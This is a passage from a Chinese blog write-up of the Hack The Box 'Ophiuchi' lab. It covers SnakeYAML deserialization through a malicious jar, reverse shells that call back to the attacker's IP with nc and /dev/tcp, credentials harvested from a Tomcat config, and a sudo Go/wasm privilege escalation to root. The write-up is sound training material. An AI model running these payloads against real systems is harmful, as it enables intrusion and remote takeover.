class="hljs-built_in">command</span> here<br>            String b64Cmd = Base64.getEncoder().encodeToString(cmd.getBytes());<br>            cmd = <span class="hljs-string">&quot;bash -c &#123;echo,&quot;</span>+b64Cmd+<span class="hljs-string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>; // *nix only<br>            Runtime.getRuntime()<br>            		.<span class="hljs-built_in">exec</span>(cmd)<br>            		.waitFor(30, TimeUnit.SECONDS); //increase this probably<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br><br>其余部分没有变动。<br><br><br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ javac src/artsploit/AwesomeScriptEngineFactory.java<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ jar -cvf yaml-payload.jar -C src/ .<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>已添加清单<br>正在忽略条目META-INF/<br>正在添加: META-INF/services/(输入 = 0) (输出 = 0)(存储了 0%)<br>正在添加: META-INF/services/javax.script.ScriptEngineFactory(输入 = 36) (输出 = 38)(压缩了 -5%)<br>正在添加: artsploit/(输入 = 0) (输出 = 0)(存储了 0%)<br>正在添加: artsploit/AwesomeScriptEngineFactory.class(输入 = 2582) (输出 = 1132)(压缩了 56%)<br>正在添加: artsploit/AwesomeScriptEngineFactory.java(输入 = 2077) (输出 = 658)(压缩了 68%)<br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ <span class="hljs-built_in">ls</span><br>README.md  src  yaml-payload.jar<br><br><br>然后开始尝试下吧，先在这个目录下挂一个网站服务<br><br><br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br><br><br><br><br>!!javax.script.ScriptEngineManager [<br>  !!java.net.URLClassLoader [[<br>    !!java.net.URL [<span class="hljs-string">&quot;http://10.10.14.8/yaml-payload.jar&quot;</span>]<br>  ]]<br>]<br><br><br>然后成功加载了，但是并没有成功获取到反弹shell，那我们就继续用方法1试一下吧<br><br><br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.10.227 - - [16/Jan/2024 16:49:58] <span class="hljs-string">&quot;GET /yaml-payload.jar HTTP/1.1&quot;</span> 200 -<br>10.10.10.227 - - [16/Jan/2024 16:49:59] <span class="hljs-string">&quot;GET /yaml-payload.jar HTTP/1.1&quot;</span> 200 -<br><br><br><br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ <span class="hljs-built_in">touch</span> shell.sh<br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ <span class="hljs-built_in">cat</span> shell.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">touch</span> /tmp/f; <span class="hljs-built_in">rm</span> /tmp/f; <span class="hljs-built_in">mkfifo</span> /tmp/f; <span class="hljs-built_in">cat</span> /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.8 443 &gt; /tmp/f<br><br><br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ vim src/artsploit/AwesomeScriptEngineFactory.java <br><br><br>Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;wget 10.10.14.8:80/shell.sh -O /tmp/shell.sh&quot;</span>);<br>Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;bash /tmp/shell.sh&quot;</span>);<br><br><br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ javac src/artsploit/AwesomeScriptEngineFactory.java<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ jar -cvf yaml-payload.jar -C src/ .<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>已添加清单<br>正在忽略条目META-INF/<br>正在添加: META-INF/services/(输入 = 0) (输出 = 0)(存储了 0%)<br>正在添加: META-INF/services/javax.script.ScriptEngineFactory(输入 = 36) (输出 = 38)(压缩了 -5%)<br>正在添加: artsploit/(输入 = 0) (输出 = 0)(存储了 0%)<br>正在添加: artsploit/AwesomeScriptEngineFactory.class(输入 = 1692) (输出 = 721)(压缩了 57%)<br>正在添加: artsploit/AwesomeScriptEngineFactory.java(输入 = 1652) (输出 = 451)(压缩了 72%)<br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br><br><br>!!javax.script.ScriptEngineManager [<br>  !!java.net.URLClassLoader [[<br>    !!java.net.URL [<span class="hljs-string">&quot;http://10.10.14.8/yaml-payload.jar&quot;</span>]<br>  ]]<br>]<br><br>中间还缺一部分呢的内容，就是获取到反弹shell后，然后通过查看配置文件，获取到密码信息<br><br>String [] cmd = &#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.8/443 0&gt;&amp;1&quot;</span>&#125;;<br>Runtime.getRuntime().<span class="hljs-built_in">exec</span>(cmd);<br><br>这里我修改成这个，也是不行，还是报错。。。。。<br></code></pre></td></tr></table></figure>
+
+<p>12、直接参考演练报告，跳过这一个环节</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">中间还缺一部分呢的内容，就是获取到反弹shell后，然后通过查看配置文件，获取到密码信息<br><br>String [] cmd = &#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.8/443 0&gt;&amp;1&quot;</span>&#125;;<br>Runtime.getRuntime().<span class="hljs-built_in">exec</span>(cmd);<br><br>这里我修改成这个，也是不行，还是报错。。。。。<br><br><br>$ <span class="hljs-built_in">ls</span> -la /home/admin<br>-r-------- 1 admin admin   33 Aug  9 13:08 user.txt<br><br><br><span class="hljs-built_in">cat</span> /opt/tomcat/conf/tomcat-users.xml<br><br>&lt;user username=<span class="hljs-string">&quot;admin&quot;</span> password=<span class="hljs-string">&quot;whythereisalimit&quot;</span> roles=<span class="hljs-string">&quot;manager-gui,admin-gui&quot;</span>/&gt;<br></code></pre></td></tr></table></figure>
+
+<p>13、使用上述密码，登录靶机，获取到第一个flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh admin@10.10.10.227                 <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.227 (10.10.10.227)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:Ir/99B9NBdGfdwnV1xsklA2aGCcZLFQsIs1kUlEOvSs.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.227<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">admin@10.10.10.227&#x27;</span>s password: <br>Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Tue 16 Jan 2024 09:14:26 AM UTC<br><br>  System load:             0.0<br>  Usage of /:              20.0% of 27.43GB<br>  Memory usage:            14%<br>  Swap usage:              0%<br>  Processes:               217<br>  Users logged <span class="hljs-keyword">in</span>:         0<br>  IPv4 address <span class="hljs-keyword">for</span> ens160: 10.10.10.227<br>  IPv6 address <span class="hljs-keyword">for</span> ens160: dead:beef::250:56ff:feb9:2a8<br><br><br>176 updates can be installed immediately.<br>56 of these updates are security updates.<br>To see these additional updates run: apt list --upgradable<br><br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br><br>Last login: Mon Jan 11 08:23:12 2021 from 10.10.14.2<br>admin@ophiuchi:~$ <span class="hljs-built_in">ls</span><br>user.txt<br>admin@ophiuchi:~$ <span class="hljs-built_in">cat</span> user.txt<br>7ec46714f412b9baa33cc41d04a01d75<br>admin@ophiuchi:~$ <br><br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>14、通过查看 sudo  发现一个利用信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@ophiuchi:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> admin on ophiuchi:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User admin may run the following commands on ophiuchi:<br>    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go<br>admin@ophiuchi:~$ <br></code></pre></td></tr></table></figure>
+
+<p>15、查看该 .go 文件信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@ophiuchi:~$ <span class="hljs-built_in">cat</span> /opt/wasm-functions/index.go<br>package main<br><br>import (<br>        <span class="hljs-string">&quot;fmt&quot;</span><br>        wasm <span class="hljs-string">&quot;github.com/wasmerio/wasmer-go/wasmer&quot;</span><br>        <span class="hljs-string">&quot;os/exec&quot;</span><br>        <span class="hljs-string">&quot;log&quot;</span><br>)<br><br><br>func <span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>        bytes, _ := wasm.ReadBytes(<span class="hljs-string">&quot;main.wasm&quot;</span>)<br><br>        instance, _ := wasm.NewInstance(bytes)<br>        defer instance.Close()<br>        init := instance.Exports[<span class="hljs-string">&quot;info&quot;</span>]<br>        result,_ := init()<br>        f := result.String()<br>        <span class="hljs-keyword">if</span> (f != <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>                fmt.Println(<span class="hljs-string">&quot;Not ready to deploy&quot;</span>)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                fmt.Println(<span class="hljs-string">&quot;Ready to deploy&quot;</span>)<br>                out, err := exec.Command(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;deploy.sh&quot;</span>).Output()<br>                <span class="hljs-keyword">if</span> err != nil &#123;<br>                        log.Fatal(err)<br>                &#125;<br>                fmt.Println(string(out))<br>        &#125;<br>&#125;<br>admin@ophiuchi:~$ <span class="hljs-built_in">ls</span> -la /opt/wasm-functions/index.go<br>-rw-rw-r-- 1 root root 522 Oct 14  2020 /opt/wasm-functions/index.go<br>admin@ophiuchi:~$ <br></code></pre></td></tr></table></figure>
+
+<p>16、这里还是比较难的，感觉考试的时候应该不会出这么难的题</p>
+<p><code>首先注意到代码中加载了 os.exec，而这个库常用于做命令执行，所以在做代码审计的时候要首先找这种高危的函数及库。通过阅读代码，在 12 行的时候加载了一个外部的 main.wasm 文件。</code></p>
+<p><code>Wasmer 是一个用于在服务器上执行 WebAssembly 的开源运行时。支持基于 WebAssembly 的超轻量级容器，该容器可以在任何地方运行，还可以嵌入其他编程语言</code></p>
+<p><code>所以，整段代码的运行逻辑是：</code></p>
+<p><code>以字节形式读取 WebAssembly 模块（main.wasm）</code><br><code>实例化 WebAssembly 模块</code><br><code>从 WebAssembly 实例获取 info 函数</code><br><code>函数内容不存在则输出提示字符串</code><br><code>函数存在则通过 exec 库执行 “/bin/sh” 运行 “deploy.sh”，打印脚本运行结果。</code><br><code>进入对应文件目录，首先查看文件夹内文件权限，main.wasm 与 deploy.sh 均是当前用户无法编辑的。好消息是脚本中并没有写绝对路径，那么我们只需要在执行 sudo 语句的文件夹内创建这两个文件，按照 shell 执行的优先级，会先找当前路径下同名文件。</code></p>
+<p>17、那开始漏洞利用吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@ophiuchi:~$ <span class="hljs-built_in">cd</span> /opt/wasm-functions/<br>admin@ophiuchi:/opt/wasm-functions$ find . -<span class="hljs-built_in">ls</span><br>  1057188      4 drwxr-xr-x   3 root     root         4096 Oct 14  2020 .<br>  1322036   2460 -rwxr-xr-x   1 root     root      2516736 Oct 14  2020 ./index<br>  1321998      4 -rw-rw-r--   1 root     root          522 Oct 14  2020 ./index.go<br>  1057205      4 -rw-r--r--   1 root     root           88 Oct 14  2020 ./deploy.sh<br>  1322001   1448 -rwxrwxr-x   1 root     root      1479371 Oct 14  2020 ./main.wasm<br>  1057190      4 drwxr-xr-x   2 root     root         4096 Oct 14  2020 ./backup<br>  1057210      4 -rw-r--r--   1 root     root          522 Oct 14  2020 ./backup/index.go<br>  1057206      4 -rw-r--r--   1 root     root           88 Oct 14  2020 ./backup/deploy.sh<br>  1057211   1448 -rwxr-xr-x   1 root     root      1479371 Oct 14  2020 ./backup/main.wasm<br>admin@ophiuchi:/opt/wasm-functions$ <br></code></pre></td></tr></table></figure>
+
+<p><code>将 WebAssembly 文本格式转换为 wasm - https://developer.mozilla.org/zh-CN/docs/WebAssembly/Text_format_to_wasm</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@ophiuchi:/opt/wasm-functions$ <span class="hljs-built_in">cd</span> backup/<br>admin@ophiuchi:/opt/wasm-functions/backup$ <span class="hljs-built_in">ls</span><br>deploy.sh  index.go  main.wasm<br><br>admin@ophiuchi:/opt/wasm-functions/backup$ python3 -m http.server 8000<br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br>10.10.14.8 - - [16/Jan/2024 09:26:18] <span class="hljs-string">&quot;GET / HTTP/1.1&quot;</span> 200 -<br>10.10.14.8 - - [16/Jan/2024 09:26:19] code 404, message File not found<br>10.10.14.8 - - [16/Jan/2024 09:26:19] <span class="hljs-string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -<br>10.10.14.8 - - [16/Jan/2024 09:26:21] <span class="hljs-string">&quot;GET /main.wasm HTTP/1.1&quot;</span> 200 -<br><br>http://10.10.10.227:8000/main.wasm<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ wasm2wat main.wasm -o main.wat <br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ vim main.wat <br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ wat2wasm main.wat -o main2.wasm<br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.10.227 - - [16/Jan/2024 17:32:40] <span class="hljs-string">&quot;GET /main2.wasm HTTP/1.1&quot;</span> 200 -<br><br>admin@ophiuchi:/opt/wasm-functions/backup$ <span class="hljs-built_in">cd</span> /tmp<br>admin@ophiuchi:/tmp$ <span class="hljs-built_in">ls</span><br>hsperfdata_tomcat<br>systemd-private-ca85384315de47ecafbd2924a2fd91d6-systemd-logind.service-ejrfbh<br>systemd-private-ca85384315de47ecafbd2924a2fd91d6-systemd-resolved.service-CwFJxf<br>systemd-private-ca85384315de47ecafbd2924a2fd91d6-systemd-timesyncd.service-uwyoTh<br>vmware-root_671-3988556280<br>admin@ophiuchi:/tmp$ wget http://10.10.14.8/main2.wasm<br>--2024-01-16 09:32:40--  http://10.10.14.8/main2.wasm<br>Connecting to 10.10.14.8:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 112 [application/wasm]<br>Saving to: ‘main2.wasm’<br><br>main2.wasm                100%[====================================&gt;]     112  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2024-01-16 09:32:40 (3.75 MB/s) - ‘main2.wasm’ saved [112/112]<br><br>admin@ophiuchi:/tmp$ <br><br>admin@ophiuchi:/tmp$ <span class="hljs-built_in">ls</span><br>hsperfdata_tomcat<br>main2.wasm<br>systemd-private-ca85384315de47ecafbd2924a2fd91d6-systemd-logind.service-ejrfbh<br>systemd-private-ca85384315de47ecafbd2924a2fd91d6-systemd-resolved.service-CwFJxf<br>systemd-private-ca85384315de47ecafbd2924a2fd91d6-systemd-timesyncd.service-uwyoTh<br>vmware-root_671-3988556280<br>admin@ophiuchi:/tmp$ <span class="hljs-built_in">cp</span> main2.wasm /opt/wasm-functions/backup/main.wasm<br><span class="hljs-built_in">cp</span>: cannot create regular file <span class="hljs-string">&#x27;/opt/wasm-functions/backup/main.wasm&#x27;</span>: Permission denied<br>admin@ophiuchi:/tmp$ <span class="hljs-built_in">cp</span> main2.wasm main.wasm<br>admin@ophiuchi:/tmp$ <span class="hljs-built_in">ls</span><br>hsperfdata_tomcat<br>main2.wasm<br>main.wasm<br>systemd-private-ca85384315de47ecafbd2924a2fd91d6-systemd-logind.service-ejrfbh<br>systemd-private-ca85384315de47ecafbd2924a2fd91d6-systemd-resolved.service-CwFJxf<br>systemd-private-ca85384315de47ecafbd2924a2fd91d6-systemd-timesyncd.service-uwyoTh<br>vmware-root_671-3988556280<br>admin@ophiuchi:/tmp$ <span class="hljs-built_in">touch</span> deploy.sh<br>admin@ophiuchi:/tmp$ vim deploy.sh <br>admin@ophiuchi:/tmp$ <span class="hljs-built_in">cat</span> deploy.sh <br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-comment"># ToDo</span><br><span class="hljs-comment"># Create script to automatic deploy our new web at tomcat port 8080</span><br><span class="hljs-built_in">touch</span> /tmp/f; <span class="hljs-built_in">rm</span> /tmp/f; <span class="hljs-built_in">mkfifo</span> /tmp/f; <span class="hljs-built_in">cat</span> /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.8 443 &gt; /tmp/f<br>admin@ophiuchi:/tmp$ <br><br>admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go<br>Ready to deploy<br></code></pre></td></tr></table></figure>
+
+<p>18、通过反弹shell，获取到了最终的flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.8] from (UNKNOWN) [10.10.10.227] 48754<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># cat /root/root.tx</span><br><span class="hljs-built_in">cat</span>: /root/root.tx: No such file or directory<br><span class="hljs-comment"># </span><br><span class="hljs-comment"># cat /root/root.txt</span><br>04fe40ae052bd5a1c78679b1b506c0a1<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>19、把那些列表里的靶机都打完后，还是付费打官方的pg靶机吧，这些靶机的难度，明显不合理。。。考试不会这么难的。。。做的都像是做高数了。。。</p>
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/315</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Ophiuchi-htb-writeup</div>
+      <div>https://sh1yan.top/2024/01/15/Ophiuchi-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/21/Seal-htb-writeup/" title="Seal-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Seal-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/14/Ready-htb-writeup/" title="Ready-htb-writeup">
+                        <span class="hidden-mobile">Ready-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
